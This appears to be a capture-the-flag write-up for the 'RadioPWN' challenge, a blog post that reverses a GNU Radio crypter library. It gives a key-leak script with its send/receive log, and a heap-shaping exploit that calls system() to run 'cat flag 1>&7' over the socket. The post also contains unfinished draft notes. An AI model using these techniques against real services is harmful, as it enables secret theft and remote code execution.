@@ -1,0 +1,743 @@
+---
+layout: post
+title:  "RadioPWN Writeup"
+---
+# Part 1 — Introduction and Challenge Setup
+
+## Introduction
+The challenge begins with a ZIP archive containing a small server implementation and its supporting artifacts. Although the folder structure appears simple at first glance, a closer inspection reveals that the service implements a custom encryption/decryption protocol based on a GNU Radio extension named mhackeroni.crypter. Our goal is to understand how the service processes incoming data and ultimately leverage this behavior to leak the secret flag stored in its key file.
+
+![hierarchy](/assets/screenshot1.jpg)
+
+## Key Artifacts
+The most relevant files for the first stage of the challenge are:
+radiopwn.py
+This Python script implements a small TCP server. For every incoming connection, the server:
+Receives arbitrary bytes.
+Passes them to mhackeroni.crypter, initialized with a path to /tmp/keys.
+Sends the “encrypted” (or decrypted, depending on flow direction) output back to the client.
+
+In other words, the server itself performs no validation or logic — it simply acts as a pass-through wrapper around the crypter library.
+
+Dockerfile
+Most of the challenge files are copied directly into the container.
+The image’s CMD executes start.sh, which handles all runtime setup.
+
+start.sh
+
+This script generates a keys file, where one of the keys is the flag.
+ The flag is injected at runtime via an environment variable, which is configured inside docker-compose.yml.
+On the real challenge server, this value is replaced—naturally—with the actual secret flag.
+
+## Interacting with the server 
+Connecting to the server manually (e.g., nc 127.0.0.1 5000) and sending arbitrary bytes immediately reveals interesting behavior:
+The crypter library logs that it loaded the keys file.
+The server returns transformed data.
+
+At this point, we already understand:
+The server accepts arbitrary user input.
+
+All input is processed by mhackeroni.crypter.
+
+The output is sent back unchanged unless the crypter decides to modify it.  
+
+The crypter receives a keys table, where one entry contains the flag.  
+
+This strongly suggests that our path to the flag must involve tricking the crypter into leaking key material.
+
+## Reversing the Crypter
+The logical next step is to reverse the GNU Radio extension. Opening libgnuradio-mhackeroni.so.1.0.0.0 in IDA and searching for relevant strings—such as “pdu received”—
+
+quickly leads to the main function that processes incoming PDUs. This is the core of the challenge and will later become the foundation for both Stage 1 (key leakage) and Stage 2 (RCE).
+
+---
+
+# Part 2 — Understanding the Crypter: Algorithm Table and Core Processing Flow
+
+## Reversing the Crypter Library
+Once inside the mhackeroni.crypter shared object, the first important observation is that the library builds an internal algorithm dispatch table at runtime. This table maps algorithm IDs to function pointers responsible for encrypting or decrypting payloads.
+During initialization, the crypter allocates memory for this table and stores references to several algorithm implementations — such as the simple XOR-based algorithm that becomes crucial later.  
+
+Later, during PDU parsing, the crypter retrieves the appropriate algorithm by indexing into this table:  
+
+This design becomes a vulnerability in Stage 2, where sending an out-of-bounds algo_id allows us to force the crypter to call arbitrary addresses located immediately after the table in heap memory.  
+
+## Investigating the XOR Algorithm
+Looking at the XOR function confirms that it performs a classic cyclic-key XOR:  
+
+This means that if we submit a payload consisting entirely of zero bytes, the output will equal the key repeated across the length of the payload — making this a perfect key-leak primitive.
+However, understanding when this XOR function is actually applied requires diving deeper into the central routine: handle_pdu.
+
+## Deep-Dive Into handle_pdu
+After reversing the verbose function surrounding PDU processing, the high-level behavior becomes clear.
+The function:
+Validates the incoming PMT pair.
+Extracts the raw byte buffer.
+Scans the buffer byte-by-byte.
+Interprets sections starting with 0x17 as encrypted blocks.
+Decrypts those blocks in place using the appropriate algorithm.
+Collapses escape sequences like 0x17 0x17 into a single literal 0x17.
+Re-emits the processed buffer as a new PDU.
+
+### Frame Structure
+Encrypted segments follow a strict wire format:
+0x17, key_id (1B), len_lo (1B), len_hi (1B), algo_id (1B), payload[len]
+
+Where:
+key_id index selects which key to use from the keys table
+len_lo,len_hi define the payload length
+algo_id selects the encryption algorithm
+payload[] is the encrypted block processed in-place
+
+If the prefix is 0x17 0x17, it is treated as an escaped literal byte rather than the start of a frame.
+
+### Per-Key Encrypter Object
+For each key ID encountered, the crypter lazily creates a small object storing:
+Pointer to the algorithm function
+Pointer to the key
+Key length
+A string representation of the key name
+
+These objects are stored in a std::map<key_id, encrypter*> internally, meaning a key is initialized only once.
+
+### Step 1: check message shape and print metadata
+if (pmt::is_pair(pair)) → OK; otherwise: "crypter: received non-PDU message" to std::cerr.  
+
+Extract meta = car(pair) and data = cdr(pair).  
+
+Print "=== PDU Received ===" and "Metadata: <meta>".  
+
+Check that data is u8vector. If not, it just republishes the original (meta,data) as a PDU on the pdus port and returns.
+
+### Step 2: get a raw pointer/length to the u8vector
+pmt::u8vector_elements(&data, &len) → returns const uint8_t* buf and fills len.  
+
+Print "Data length: <len> bytes".  
+
+I’ll call this array in and its size in_len.
+
+### Step 3: main scan loop over the bytes
+The loop walks the input and handles escaping and encrypted blocks. There are two pointers/indexes visible in the decompiled code:
+i (named v63) – input index (how far we’ve consumed the original buffer).  
+
+out (named v64) – where to write the resulting bytes (de-escaping can shrink). In practice the code writes back into the same array (in-place) and advances out as it produces output.  
+
+Two cases inside the loop:
+
+#### 3a) Regular byte, not 0x17
+```c
+if (in[i] != 0x17) {
+    *out++ = in[i++];
+    continue;
+}
+```
+
+#### 3b) Starts with 0x17 → look ahead
+
+Let:
+marker     = in[i]            // == 0x17
+key_id     = in[i+1]
+len_lo     = in[i+2]
+len_hi     = in[i+3]
+algo_id    = in[i+4]
+payload    = &in[i+5]
+payloadLen = uint16_t(len_lo | (len_hi << 8))
+
+Now two sub-cases:
+
+**Escaped 0x17:** if key_id == 0x17 (i.e., the sequence is 0x17 0x17), this is the escape for a literal 0x17.
+Action: write a single 0x17 to *out, advance i by 2, advance out by 1. (This collapses the doubled byte.)
+
+**Encrypted block:** otherwise we have a PDU crypto block.
+
+It logs: "Decrypting <payloadLen> bytes\n".
+
+It picks the algorithm from the table by algo_id:
+
+```c
+algo = algos[algo_id];  // e.g., none_algo or xor_algo
+```
+
+It looks up (or creates & caches) an “encrypter” context for this key_id:
+
+There is a std::map<unsigned long, encrypter*> implemented as a red-black tree (v232 root). All the long *Rb_tree** code is insertion/lookup in this map keyed by key_id.
+
+If the entry doesn’t exist, it creates one:
+
+It allocates a small struct encrypter (v217, 0x28 bytes) whose first field is a function pointer to the chosen algo, and whose “context” fields store the key material and key name.
+
+Where does key material come from? From a per-key table hanging off the block instance: base = a1[1] + 32 * key_id. At that slot it reads:
+
+key_data_ptr
+
+key_length
+
+a std::string key name (copied into the encrypter)
+
+This becomes the source context passed to the algo.
+
+Insert that encrypter* into the map under key_id.
+
+Decrypt in place: finally it calls the selected algorithm function pointer like:
+
+```c
+algo(/*dest=*/payload, /*size=*/payloadLen, /*source/context=*/encrypter->ctx);
+```
+
+For xor_algo (provided below), that means:
+
+```c
+for each j in [0..payloadLen-1]:
+    payload[j] ^= key[ j % key_len ];
+```
+
+After decryption, the loop skips over the whole encoded block in the input:
+
+```c
+i += 1 /*0x17*/ + 1 /*key*/ + 2 /*len*/ + 1 /*algo*/ + payloadLen;
+```
+
+Note: the code’s bookkeeping uses the same i and an out pointer, so the “write side” can differ from “read side” due to 0x17 0x17 collapsing. The decrypted payload remains where it is (in place). The surrounding logic keeps the buffer coherent and at the end re-wraps it as the outgoing PMT.
+
+When i reaches in_len, the loop ends.
+
+### Step 4: package and publish the result
+
+It prints a newline or two (those ctype::widen + ostream::put calls).
+
+It builds a new PMT u8vector from the (now modified) byte array (in place).
+
+It pairs the original meta with the modified data:
+
+```c
+out_pair = cons(meta, new_u8vector)
+```
+
+It resolves the symbol "pdus" (one-time creation of a PMT symbol) and calls:
+
+```c
+gr::basic_block::message_port_pub(this, "pdus", out_pair);
+```
+
+It does the expected PMT refcount cleanups and returns.
+
+On the error path (not a pair / not a u8vector), it re-publishes the original pair or logs to std::cerr.
+
+### pseudo-code
+
+```text
+on handle_pdu(pair):
+  if !is_pair(pair): log error; return;
+
+  meta = car(pair)
+  data = cdr(pair)
+  if !is_u8vector(data): publish(pair) and return;
+
+  buf, len = u8vector_elements(data)
+  out = buf
+
+  i = 0
+  while (i < len):
+    if (buf[i] != 0x17) {
+      *out++ = buf[i++]
+      continue
+    }
+
+    // 0x17 prefix
+    if (i+1 < len && buf[i+1] == 0x17) {
+      *out++ = 0x17
+      i += 2
+      continue
+    }
+
+    key_id  = buf[i+1]
+    payloadLen = uint16(buf[i+2] | buf[i+3] << 8)
+    algo_id = buf[i+4]
+    payload = &buf[i+5]
+
+    encr = map_by_key_id.get_or_create(key_id, algo_id, key_table[key_id])
+    encr->fn(/*dest*/payload, /*size*/payloadLen, /*ctx*/encr->ctx)
+
+    i += 5 + payloadLen  // skip whole encoded block
+  end
+
+  // (buffer modified in place)
+  publish( cons(meta, make_u8vector(buf, len)) )  // out port "pdus"
+```
+
+That’s the core logic: detect framed blocks, decrypt those blocks in place using a per-key algorithm, de-escape 0x17 0x17, and re-emit the processed PDU.
+
+---
+
+## Key Insight: Controlled Decryption + Zero Payload = Full Key Leak
+
+From reversing the logic, we learn:
+If we send a valid frame with:
+A chosen key_id
+algo_id = XOR
+payload = bytes([0x00] * N)
+
+Then the decryption output becomes exactly:
+key repeated until N bytes are filled
+And because the server returns the processed buffer back to us, this becomes a pure oracle for leaking key material.
+This insight enables Stage 1 of the exploit: retrieving all keys, including the one containing the flag.
+
+---
+
+# Part 3 — Leveraging the Parsing Logic: Building the Key-Leak Exploit (Stage 1)
+
+## Understanding the Leak Primitive
+
+With the crypter’s behavior reversed, we now have everything needed to turn it into a key oracle. The crucial observation is simple:
+If the XOR algorithm is applied to a payload of all-zero bytes, the output is just the key repeated.
+Why?
+Because XOR with zero is an identity operation:
+0x00 ^ KeyByte = KeyByte
+
+Since the crypter decrypts the payload in place and then returns the modified buffer to us, all we have to do is:
+Craft a valid frame.
+
+Choose which key we want to leak (key_id).
+
+Choose algorithm 1 (XOR).
+
+Declare a payload of arbitrary length (e.g., 0x40 bytes).
+
+Fill the payload entirely with zero bytes.
+
+The crypter will XOR our zeros with the real key, byte-by-byte, and return the result—effectively giving us the raw key.
+
+## Crafting the Key-Leak Frame
+
+Each frame follows the format:
+0x17 | key_id | len_lo | len_hi | algo_id | payload[len]
+
+To leak a key:
+0x17 marks the start of an encrypted block
+
+key_id selects which key to fetch from /tmp/keys
+
+len_lo, len_hi define the size of the payload
+
+algo_id = 0x01 selects the XOR algorithm
+
+payload = b'\x00' * len ensures the output is uninterrupted key bytes
+
+This gives us full control over which key the crypter uses and how much of it is revealed.
+
+## Automating the Leakage for All Keys
+
+Because the server stores multiple keys (16 in this challenge), we can simply loop over all key IDs and build one frame for each:
+
+```python
+def test_good(): # leak key
+    # Format: 0x17, key_id, len_lo, len_hi, algo_id, payload...
+    for key_id in range(0xf):
+        declared_len = 0x40
+        algo_id = 0x1
+        frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + declared_len * b'\x00'
+        send_bytes(frame)
+```
+
+When sent to the service, every response contains the decrypted key, repeating until the declared payload length is exhausted.
+
+### Example Output
+
+A portion of the leakage output looks like this:
+
+```text
+sending b'\x17\x0c@\x00\x01\x00...'
+recv: b'\x17\x0c@\x00\x01space{FAKE_FLAG}space{FAKE_FLAG}space{FAKE_FLAG}...'
+```
+
+You can clearly see that key 0x0C contains the placeholder flag:
+space{FAKE_FLAG}
+
+And on the real remote server:
+space{1m_1n_j4p4n_c4n_y0u_g3t_rc3_f0r_m3?_7yk90lah543}
+
+Stage 1 complete — the entire key table (and the flag) has been leaked successfully.
+
+```text
+sending b'\x17\x00@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x00@\x00\x01N7hafqgUXHeFlD0cN7hafqgUXHeFlD0cN7hafqgUXHeFlD0cN7hafqgUXHeFlD0c\x00'
+sending b'\x17\x01@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x01@\x00\x01MuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xU\x00'
+sending b'\x17\x02@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x02@\x00\x0101enESlYdVA1CbBT01enESlYdVA1CbBT01enESlYdVA1CbBT01enESlYdVA1CbBT\x00'
+sending b'\x17\x03@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x03@\x00\x01KKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiG\x00'
+sending b'\x17\x04@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x04@\x00\x01dydAVgUp2oPazZtFdydAVgUp2oPazZtFdydAVgUp2oPazZtFdydAVgUp2oPazZtF\x00'
+sending b'\x17\x05@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x05@\x00\x011CByrKzq9nqJVDZi1CByrKzq9nqJVDZi1CByrKzq9nqJVDZi1CByrKzq9nqJVDZi\x00'
+sending b'\x17\x06@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x06@\x00\x01RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0\x00'
+sending b'\x17\x07@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x07@\x00\x01FcUoW42TXSANcH9BFcUoW42TXSANcH9BFcUoW42TXSANcH9BFcUoW42TXSANcH9B\x00'
+sending b'\x17\x08@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x08@\x00\x01bRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDd\x00'
+sending b'\x17\t@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\t@\x00\x017EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ\x00'
+sending b'\x17\n@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\n@\x00\x01IBas9wldIjuaKb9aIBas9wldIjuaKb9aIBas9wldIjuaKb9aIBas9wldIjuaKb9a\x00'
+sending b'\x17\x0b@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x0b@\x00\x01C23f0xYARVNdBjx7C23f0xYARVNdBjx7C23f0xYARVNdBjx7C23f0xYARVNdBjx7\x00'
+sending b'\x17\x0c@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x0c@\x00\x01space{FAKE_FLAG}space{FAKE_FLAG}space{FAKE_FLAG}space{FAKE_FLAG}\x00'
+sending b'\x17\r@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\r@\x00\x01reZW1DbJp7K7M6whreZW1DbJp7K7M6whreZW1DbJp7K7M6whreZW1DbJp7K7M6wh\x00'
+sending b'\x17\x0e@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+recv: b'\x17\x0e@\x00\x01hTSrY8C7v31MfTbahTSrY8C7v31MfTbahTSrY8C7v31MfTbahTSrY8C7v31MfTba\x00'
+```
+
+You can see one of the received flags in the space{FAKE_FLAG}
+Now with the real server:
+space{1m_1n_j4p4n_c4n_y0u_g3t_rc3_f0r_m3?_7yk90lah543}
+Win!
+
+---
+
+# Part 4 — Stage 2 Overview: From Key Leakage to Remote Code Execution (Radiopwn2)
+
+Enhanced Version
+
+Stage 1 focused on abusing the crypter’s parsing logic to leak all encryption keys, including the embedded flag.
+Stage 2, however, is a completely different style of challenge: here the flag is stored in a file, not inside the keys table. Nothing in the program ever reads this file during normal operation.
+Therefore, leaking keys is no longer useful — we now need code execution.
+
+## What Changes in Radiopwn2?
+
+In the second challenge, the flag is located in a file called flag (with the contents space{FAKE_FLAG_2}). This file is:
+Copied into the container via Dockerfile
+
+Owned by the same user that runs the service
+Completely unknown to the program logic (never opened)
+
+This means:
+To obtain the second flag, we must make the crypter or its host process execute a command that manually reads the file.
+Since the program itself never references it, information disclosure is insufficient — we must escalate to RCE.
+
+## Initial Recon: What Exploitation Primitives Do We Have?
+
+From reversing Stage 1 and exploring the crypter behavior deeper, two powerful primitives emerge:
+
+### 1. Buffer Over-Read Primitive
+
+If we send a frame where the declared payload length (len_lo | len_hi << 8) is greater than the actual number of payload bytes we provide, the crypter will:
+Decrypt in place up to the declared length
+
+Read past the end of our buffer
+
+Echo back whatever memory lies beyond
+
+This gives us memory disclosure, especially useful for examining heap layouts.
+
+### 2. Arbitrary Function Pointer Call (Limited)
+
+Recall the algorithm dispatch table:
+algos[algo_id] → function pointer
+
+The table is dynamically allocated on the heap during initialization. If we send an algo_id larger than the table size, the crypter will read out-of-bounds memory and interpret whatever 8 bytes it finds there as a function pointer.
+And then it will call it.
+This means we can hijack execution, but only to addresses located immediately after the algorithm table allocation on the heap.
+This becomes the core RCE primitive for the stage.
+
+## Is ASLR an Issue?
+
+Fortunately:
+PIE is disabled
+The service runs a fixed python3.12 binary
+libc is loaded at predictable addresses on every restart
+
+This means:
+system() has a stable, known address.
+
+## Why Heap Shaping Matters
+
+The algorithm table is allocated at runtime with a small fixed size:
+Table entry size: 8 bytes
+
+Total allocation: ~0x18 bytes (3 algorithms × 8 bytes)
+
+These small allocations are handled by tcache bins (for size 0x20).
+To control what comes immediately after this allocation in memory, we must carefully:
+Create allocations
+Free allocations
+Refill tcache bins
+Trigger new allocations in specific order
+
+The goal is to place our crafted frame buffer directly after the algorithm table.
+When that happens:
+The crypter interprets our payload as algos[algo_id]
+The fake function pointer at the right offset becomes system()
+The argument passed to the function is our controlled command string
+
+This results in arbitrary command execution inside the container, allowing us to read and exfiltrate the flag.
+
+---
+
+## stage 2
+
+After the competition I decided to check what it takes to solve the second challenge called radiopwn2.
+
+No let’s think how to build an exploit that reads this flag file which is wasn’t previously read by the program. My best case scenario would be running a system commandline that would somehow get this flag back.
+
+In the previous challenge I’ve found 2 interesting primitives:
+buffer over read - if i send a frame with larger length than the actual payload I get a data leak
+call to an address on the heap (limited) - I found out that I can send an algo id which is out of bounds which means it would call an address, which maybe I could control.
+
+maybe talk here about gdb setup!!!!!!!!
+
+let’s see how I could get system address:
+Let’s check if I need my memory leak?
+
+PIE disabled - I don’t need any like the addresses in python3.12 binary are fixed.
+Great so let’s find the SYSTEM address.
+
+alright so we know the system address and we have a limited call to an address on the heap.
+
+I somehow need to shape the heap to get to a state that a data I control sits near the end of the allocation that contains the list of encryption algorithms, so I could result a call to system.
+
+For this stage familiarity with the concept of tcache is a must:
+I know that the encryption algos list is allocated size 0x18, this chunk should be allocated from trachbin list that holds size 0x20.
+
+I used this concept to shape the 0x18 and 0x28 free chunks lists
+
+The thing is that I need my first allocation of the received input to sit after the later allocation of the encryption algo list. This can happen if you retrieve the chunks in the correct order.
+
+so when sending the right sequence we get a great heap shape so that the frame sits after and near the algo list, so we could put an address into the frame payload and call it!
+
+---
+
+## Prerequisite: Understanding system()’s Argument
+
+To extract the flag, we need a working shell command whose output returns over our open network socket.
+Examining the file descriptors inside the container:
+FD 7 corresponds to our TCP connection
+Writing to FD 7 sends bytes directly back to us
+
+Therefore, a simple and elegant command works:
+
+```sh
+cat flag 1>&7
+```
+
+This:
+Reads the flag file
+Redirects stdout to FD 7 (our socket)
+Sends the flag back to the attacker
+
+This command becomes the basis of the crafted payload injected into heap memory.
+((((((((((((((((((((
+
+when actually communicating this is the state
+
+so the fd of the socket is 7.
+)))))))))))))))))))))))))))))
+
+---
+
+# Part 5 — Stage 2 Exploit: Heap Shaping, Fake Algo, and Calling system()
+
+Enhanced Version
+
+In Stage 2, we already know:
+We can make the crypter call a function pointer from the algorithm table using a controlled algo_id.
+
+system() has a known, stable address (PIE disabled, fixed Python binary).
+
+The flag lives in a file (flag) that the program never reads by itself.
+
+Now we want to turn the out-of-bounds algo_id into a reliable call to system(cmd), where cmd is fully controlled and reads the flag back to our socket.
+To achieve this, we need to:
+Shape the heap so that our frame buffer sits immediately after the algorithm table allocation.
+
+Place the system() address at a predictable offset relative to the start of that allocation.
+
+Use an out-of-bounds algo_id so that algos[algo_id] points into our controlled data, where the fake function pointer (system) lives.
+
+Make sure the “argument” passed to that function is a pointer to our command string ("cat flag 1>&7").
+
+## Heap Internals: Why tcache Matters
+
+The algorithm table is allocated with size 0x18 bytes (3 entries × 8-byte function pointers). On glibc, this goes into the tcache bin for size 0x20.
+We can also influence other allocations of similar sizes by sending frames and causing the crypter to allocate and free temporary structures. By carefully choosing:
+How many frames we send
+
+Their sizes
+
+In which order allocations and frees occur
+
+we can influence which freed chunks are reused for:
+The algorithm table allocation
+
+The buffer holding our final crafted frame
+
+The end goal is to obtain a heap layout like:
+[ 0x18-byte chunk: algos table ]
+[ 0x... byte chunk: our frame buffer (controlled) ]
+
+Once this happens, any out-of-bounds index into algos[] will read into our frame buffer and interpret it as an array of function pointers.
+
+## Placing system() on the Heap
+
+Remember the call pattern:
+algos[algo_id](payload, len, ctx);
+
+Conceptually, what we want is:
+algos[algo_id] = system;
+payload        = pointer to "cat flag 1>&7"
+
+So we craft our frame payload to contain:
+A command string: "cat flag 1>&7" (with spaces for alignment).
+
+A null terminator (\x00).
+
+The address of system() immediately afterwards.
+
+Padding to fill the rest of the declared payload.
+
+Because the crypter interprets algos[algo_id] as a function pointer, if we pick the correct index (i.e., the correct offset into this buffer), it will land exactly on the 8-byte chunk containing the system() address.
+In the exploit, the final payload looks like:
+
+```python
+small_payload = (
+    b'cat  flag 1>&7    '     # command string + spaces for alignment
+    b'\x00'                   # null terminator
+    b'\xc0\x06\x42\x00\x00\x00\x00\x00'
+    b'\x00\x00\x00\x00\x00\x00\x00\x00'
+)
+```
+
+Here:
+The ASCII part is the shell command.
+
+The \x00\xc0\x06\x42... sequence encodes the address of system() (little-endian).
+
+The extra zeros are padding to keep the memory nicely shaped.
+
+You also choose the frame length so that:
+5 bytes (frame header) + command + \0 + system address
+neatly fill a 0x18-sized region when combined.
+
+## Finding the Right algo_id Offset
+
+After heap shaping, we set a breakpoint inside handle_pdu, at the moment the algo table is allocated, and capture its address. Then we inspect memory around it.
+
+Not far after the algos allocation, we can see:
+The table itself
+
+Our frame buffer
+
+The command string
+
+The embedded system() pointer
+
+By dumping memory, we can count how many 8-byte steps it takes from the start of the algos allocation to reach the system() address inside our payload.
+That count turns out to be:
+0x11 (17 decimal)
+
+Since each entry is 8 bytes, algos[0x11] ends up reading the fake pointer embedded in our frame, which we set to system().
+Thus:
+algo_id = 0x11
+→ algos[0x11] = *(heap_base + 0x11 * 8)
+→ That location holds the system() address
+
+When the crypter calls:
+algos[algo_id](payload, len, ctx);
+
+It effectively becomes:
+system("cat flag 1>&7");
+
+because payload points into our frame buffer where the command string lives.
+
+## Making the Layout Deterministic: Crashing the Server
+
+Heap exploitation can be fragile if the layout changes between runs. Luckily, the challenge setup uses supervisord to automatically restart the service when it crashes.
+
+This gives us a powerful advantage:
+We can deliberately crash the process to reset it into a fresh, predictable heap state.
+
+After restart, the sequence of allocations and frees we perform will be the same every time, as long as we send the same frames in the same order.
+
+By combining:
+Knowledge of tcache behavior
+
+A stable restart mechanism
+
+Controlled allocations via frames
+
+we get a deterministic heap layout, which means the offset (algo_id = 0x11) and the position of our crafted chunk stay reliable.
+
+## Debugging: Verifying Layout with GDB
+
+To confirm everything:
+Attach gdb to the Python process inside the container.
+
+Set a breakpoint in handle_pdu near the allocation of the algorithm table.
+
+Send the final malicious frame.
+
+When the breakpoint hits, print memory starting from the algo table address.
+
+The memory dump shows:
+The algos table at the start of the allocation.
+
+Immediately following it, our crafted frame data.
+
+Inside that frame, the command string and the system() pointer.
+
+Once this is verified, we know that:
+Using algo_id = 0x11 will indeed index into our fake system() pointer.
+
+The payload argument points to the command string ("cat flag 1>&7").
+
+At that point, letting execution continue triggers the exploit.
+
+## Triggering the Exploit and Getting the Flag
+
+With everything aligned:
+We perform the heap-shaping sequence.
+
+We send the final crafted frame with:
+
+A suitably shaped payload containing "cat flag 1>&7" and system() address.
+
+algo_id = 0x11.
+
+The crypter interprets algos[0x11] as our fake function pointer.
+
+It calls system("cat flag 1>&7").
+
+Because FD 7 is the socket connecting us to the service, the command:
+cat flag 1>&7
+
+reads the flag file and writes the output directly to our connection.
+Result: the second flag is printed back over the socket.
+Win!
+We’ve escalated from a controlled key-decryption primitive in Stage 1
+to full code execution with system() in Stage 2 and successfully exfiltrated space{FAKE_FLAG_2} (and the real flag on the remote server).
+
+---
+
+Yes thats it:
+
+Im attaching here the full exploit which resulted in getting the flag!
+
+---
+
+# Part 6 — Conclusion
+
+The Radiopwn challenges demonstrate how small design flaws compound into powerful exploitation paths.
+In Stage 1, a weak framing format and unauthenticated XOR “encryption” turned the crypter into a key oracle. Because decryption occurred in place and the output was returned to the client, sending zero-filled payloads directly exposed the keys, including the flag.
+Stage 2 expanded this into code execution. Two issues made this possible:
